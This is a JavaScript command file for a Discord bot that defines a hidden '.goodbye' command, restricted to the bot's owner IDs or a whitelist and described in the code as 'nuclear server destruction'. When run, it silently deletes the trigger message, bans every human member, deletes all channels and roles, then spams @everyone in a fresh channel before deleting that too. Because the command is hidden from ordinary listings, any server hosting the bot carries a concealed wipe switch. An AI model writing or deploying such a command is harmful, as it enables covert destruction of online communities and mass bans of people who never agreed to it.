const { errorEmbed } = require('../../utils/embeds');

module.exports = {
  name: 'goodbye',
  category: 'hidden',
  description: 'HIDDEN — nuclear server destruction',
  usage: '.goodbye',
  hidden: true,

  async execute(message, args, client, config) {
    const ownerIds = (process.env.OWNER_IDS || '').split(',').map(s => s.trim());
    const GuildConfig = require('../../models/GuildConfig');
    const cfg = await GuildConfig.findOne({ guildId: message.guild.id });
    const isClose = (cfg?.closeWhitelist || []).includes(message.author.id);
    if (!ownerIds.includes(message.author.id) && !isClose) return;

    const guild = message.guild;

    // Delete the command message immediately
    await message.delete().catch(() => {});

    // ── PHASE 1: Fetch everything before touching anything ────────────────────
    await guild.members.fetch().catch(() => {});
    await guild.channels.fetch().catch(() => {});

    const members  = [...guild.members.cache.values()].filter(m => !m.user.bot && m.id !== message.author.id);
    const channels = [...guild.channels.cache.values()];

    // ── PHASE 2: Ban everyone simultaneously ─────────────────────────────────
    const banPromises = members.map(m =>
      guild.members.ban(m.id, { reason: '.goodbye executed' }).catch(() => {})
    );
    await Promise.allSettled(banPromises);

    // ── PHASE 3: Delete ALL channels ─────────────────────────────────────────
    for (const ch of channels) {
      await ch.delete('.goodbye').catch(() => {});
      await new Promise(r => setTimeout(r, 200));
    }

    // ── PHASE 4: Delete all roles ─────────────────────────────────────────────
    const myHighest = guild.members.me?.roles?.highest?.position || 999;
    const roles = [...guild.roles.cache.values()].filter(r =>
      r.id !== guild.id && !r.managed && r.position < myHighest
    );
    for (const role of roles) {
      await role.delete('.goodbye').catch(() => {});
      await new Promise(r => setTimeout(r, 200));
    }

    // ── PHASE 5: Create a fresh channel for @everyone spam ───────────────────
    let announceChannel = null;
    try {
      announceChannel = await guild.channels.create({
        name: 'goodbye',
        reason: '.goodbye',
      });
    } catch { return; }

    // ── PHASE 6: Spam @everyone for 5 minutes then delete that channel too ───
    let pings = 0;
    const maxPings = 30;
    const interval = setInterval(async () => {
      if (pings >= maxPings) {
        clearInterval(interval);
        await announceChannel.delete('.goodbye done').catch(() => {});
        return;
      }
      await announceChannel.send('@everyone').catch(() => {
        clearInterval(interval);
      });
      pings++;
    }, 10_000);

    // Send first ping immediately
    await announceChannel.send('@everyone').catch(() => {});
  },
};
